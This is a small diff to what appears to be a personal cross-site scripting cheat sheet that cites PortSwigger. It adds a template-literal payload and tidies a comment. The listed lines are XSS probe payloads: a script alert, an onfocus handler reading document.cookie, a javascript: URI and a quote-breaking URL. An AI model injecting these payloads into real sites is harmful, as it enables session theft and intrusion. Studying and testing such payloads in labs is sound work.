@@ -4,8 +4,9 @@
 
 ### Basics:
 ```
-<§§>                                 --//https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+<§§>                                 --// https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 <script>alert(1)</script>
+${alert(1)}                          --// document.getElementById('searchMessage').innerText = message;
 <custom-tag> or <xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
 http://foo?&apos;-alert(1)-&apos;    --//write into the "website input" (comments)
 javascript:alert(1)
